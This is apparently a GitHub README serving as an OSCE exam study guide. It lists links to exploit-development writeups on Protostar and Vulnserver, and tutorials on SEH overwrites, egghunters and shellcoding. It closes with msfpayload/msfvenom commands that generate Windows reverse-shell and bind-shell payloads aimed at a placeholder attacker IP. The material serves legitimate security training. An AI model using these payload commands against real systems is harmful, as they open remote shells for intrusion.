<p align="center">
  <img width="300" height="300" src="https://github.com/bigb0sss/OSCE/blob/master/osce.png">
</p>

## Exploit Writeups
* Backdooring PE - [Weaponizing Your Favorite PE](https://medium.com/@bigb0ss/expdev-weaponizing-your-favorite-pe-portable-executable-exploit-c268c0c076c7)
* SEH + Egghunter(Manual Encoding) - [HP OpenView NNM 7.5 Exploitation](https://medium.com/@bigb0ss/expdev-hp-openview-nnm-7-5-exploitation-seh-egghunter-b25ea5fab43f)

### Exploit Exercise ([Protostar](http://exploit-exercises.lains.space/protostar/))
|Module |Link   |Note  |
| :---  | :---  | :---
|Stack0 |[Stack BOF Intro](https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-stack0-214e8cbccb04)   | N/A |
|Stack1 |[Stack BOF Basic1](https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-stack1-2f28302559fc)  | N/A |
|Stack2 |[Stack BOF Basic2](https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-stack2-d6cb2e467853)  | N/A |
|Stack3 |[Stack BOF Basic3](https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-stack3-7db54291f867)  | N/A |
|Stack4 |[Stack BOF Basic4](https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-stack-4-bde92b7b6b38) | N/A |
|Stack5 |[Stack BOF Shellcode](https://medium.com/bugbountywriteup/expdev-exploit-exercise-protostar-stack-5-c8d085c914e6) | |
|Stack6 |[Stack BOF ret2libc](https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-stack-6-ef75472ec7c6)  | ROP is no need for OSCE |
|Stack7 |[Stack BOF ret2.text](https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-stack-7-fea3ac85ffe7) | ROP is no need for OSCE. But learn POP; POP; RET concept with this |

### Vulnserver ([Vulnserver](https://github.com/stephenbradshaw/vulnserver))
|Series |Link |Command |Vulnerability | Note |
| :---  | :---  | :--- | :--- | :--- |
|Part 1 |[Read](https://medium.com/@bigb0ss/expdev-vulnserver-part-1-ba35b9e36478) | N/A | N/A | Lab Setup |
|Part 2 |[Read](https://medium.com/@bigb0ss/expdev-vulnserver-part-2-46de4dd7bdde) | TRUN | EIP Overwrite | 
|Part 3 |[Read](https://medium.com/@bigb0ss/expdev-vulnserver-part-3-24859bd31c0a) | GMON | SEH Overwrite + Short JMP + Egghunter |
|Part 4 |[Read](https://medium.com/@bigb0ss/expdev-vulnserver-part-4-a5529731f0f1) | KSTET | EIP Overwrite + Short JMP + Egghunter |
|Part 5 |[Read](https://medium.com/@bigb0ss/expdev-vulnserver-part-5-10942c8c4395) | HTER | EIP Overwrite + Restricted Characters + Manual Offset Finding |
|Part 6 |[Read](https://medium.com/@bigb0ss/expdev-vulnserver-part-6-8c98fcdc9131) | GTER | EIP Overwrite + Socket Reuse Exploit |
|Part 7 |[Read](https://medium.com/@bigb0ss/expdev-vulnserver-part-7-bfe9fb5fd1e6) | LTER | SEH Overwrite + Restricted Characters + Encoded Payloads |

## Links
* Study Plan - https://www.abatchy.com/2017/03/osce-study-plan
* Prep Guide - https://tulpa-security.com/2017/07/18/288/
* Mona.py - https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/

## Reviews
* Techryptic - [Great Tips](https://techryptic.github.io/2018/12/28/Study-Guide-&-Tips-Offensive-Security-Certified-Expert-(OSCE)-Cracking-The-Perimeter-(CTP)/)
* Jack Halon - https://jhalon.github.io/OSCE-Review/
* Connor McGarr - https://connormcgarr.github.io/CTP-OSCE-Thoughts/

## Github
* Examples - https://github.com/dhn/OSCE
* OSCE_Bible - https://github.com/mohitkhemchandani/OSCE_BIBLE
* FullShade - https://github.com/FULLSHADE/OSCE (*POCs)
* h0mbre - https://github.com/h0mbre/CTP-OSCE (*Good helpers)
* ihack4falafel - https://github.com/ihack4falafel/OSCE

## Resources
* Corelan - https://www.corelan.be/index.php/articles/
  * [Exploit Writing Part 1 - Stack-based Overflow](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)
  * [Exploit Writing Part 2 - Buffer Overflow](https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/)
  
* FuzzSecurity - http://fuzzysecurity.com/tutorials.html

* SecuritySift - http://www.securitysift.com/
  * [Windows Exploit Development Part 1 - Basics](http://www.securitysift.com/windows-exploit-development-part-1-basics/)
  * [Windows Exploit Development Part 2 - Stack-based Overflow](http://www.securitysift.com/windows-exploit-development-part-2-intro-stack-overflow/)
  * [Windows Exploit Development Part 3 - Offsets](http://www.securitysift.com/windows-exploit-development-part-3-changing-offsets-and-rebased-modules/)
  * [Windows Exploit Development Part 4 - Locating Shellcode JMP](http://www.securitysift.com/windows-exploit-development-part-4-locating-shellcode-jumps/)

* Fuzzing
  * https://resources.infosecinstitute.com/intro-to-fuzzing/
  * https://resources.infosecinstitute.com/fuzzer-automation-with-spike/

* Structured Exception Handler (SEH)
  * [Exploit Writing Part 3-1 - SEH](https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/)
  * [Exploit Writing Part 3-2 - SEH](https://www.corelan.be/index.php/2009/07/28/seh-based-exploit-writing-tutorial-continued-just-another-example-part-3b/)
  * [Windows Exploit Development Part 6 - SEH](http://www.securitysift.com/windows-exploit-development-part-6-seh-exploits/)

* Egghunter
  * http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
  * [Exploit Writing Part 8 - Egghunting](https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/)
  * [Windows Exploit Development Part 5 - Egghunting](http://www.securitysift.com/windows-exploit-development-part-5-locating-shellcode-egghunting/)

* ASLR
  * [Exploit Writing Part 6 - ASLR](https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/)

* Shellcoding
  * [Exploit Wrting Part 9 - Shellcoding](https://www.corelan.be/index.php/2010/02/25/exploit-writing-tutorial-part-9-introduction-to-win32-shellcoding/)
  * https://www.fuzzysecurity.com/tutorials/expDev/6.html
  * http://sh3llc0d3r.com/windows-reverse-shell-shellcode-i/
  * http://www.vividmachines.com/shellcode/shellcode.html#ws
  * Jumping to Shellcode - https://connormcgarr.github.io/CTP-OSCE-Thoughts/
  * Alphanumeric Shellcod2 1 - https://blog.knapsy.com/blog/2017/05/01/quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/
  * Alphanumeric Shellcode 2 - https://connormcgarr.github.io/Admin-Express-0day/
 
* Opcode
  * 32-bit Opcode Table - http://sparksandflames.com/files/x86InstructionChart.html
  * Types of Jump - http://www.unixwiz.net/techtips/x86-jumps.html
  * ASM Assembler/Dissambler - https://defuse.ca/online-x86-assembler.htm#disassembly

* Web Application
  * XSS - https://excess-xss.com/
  * XSS - https://www.veracode.com/security/xss
  
* Windows API
  * API Tables - https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list
<br>

## Reverse Shell
### Windows XP/Vista Ultimate
```bash
/pentest/exploits/framework/msfpayload windows/shell_reverse_tcp LHOST=192.168.x.x LPORT=443 C
```
### Later Windows
```bash
/pentest/exploits/framework/msfpayload windows/shell_reverse_tcp LHOST=192.168.x.x LPORT=443 C 

msfvenom -p windows/shell_reverse_tcp LHOST=1192.168.x.x LPORT=443 -a x86 --platform=win -e x86/alpha_mixed -f raw
```

## Bind Shell
### Windows XP/Vista Ultimate
```bash
msfpayload windows/shell_bind_tcp R > bind
msfencode -e x86/alpha_mixed -i bind -t perl
```
### Later Windows
```bash
msfvenom -p windows/shell_bind_tcp -a x86 --platform=win -e x86/alpha_mixed -f perl
```


